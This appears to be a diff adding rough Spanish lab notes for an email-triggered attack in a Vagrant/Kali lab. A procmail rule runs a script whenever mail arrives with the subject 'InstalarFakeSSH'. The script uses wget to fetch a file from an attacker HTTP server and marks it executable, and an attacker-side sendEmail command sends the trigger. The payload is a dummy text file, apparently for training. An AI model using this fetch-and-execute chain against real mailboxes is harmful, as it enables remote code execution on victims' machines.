@@ -1,0 +1,37 @@
+se crea 
+~/inbox$ nano wget_script.sh
+
+#!/bin/bash
+# Crear la carpeta vagrant_archivos si no existe
+mkdir -p /home/vagrant/vagrant_archivos
+
+# Descargar el archivo fake_payload y guardarlo en /home/vagrant/vagrant_archivos
+wget http://192.168.0.21:80/fake_payload.txt -O /home/vagrant/vagrant_archivos/fake_payload.txt
+
+# Otorgar permisos de ejecución al archivo descargado
+chmod +x /home/vagrant/vagrant_archivos/fake_payload.txt
+
+permisos 
+
+chmod +x ~/inbox/wget_script.sh
+
+nano ~/.procmailrc
+
+:0
+* ^Subject: InstalarFakeSSH
+| $HOME/inbox/wget_script.sh
+
+
+////////////////////////////////////////////////////////////////
+mkdir ~/payloads 
+
+ cd ~/payloads 
+
+ echo "Este es el payload falso" > fake_payload.txt
+
+ ──(vagrant㉿kali)-[~/payloads]
+└─$ python3 -m http.server 80
+
+sendEmail -f ataque@maligno.com -t vagrant@ubuntu.local -u "InstalarFakeSSH" -m "Aqui tienes tu update" -s 192.168.0.31 -o tls=no
+
+
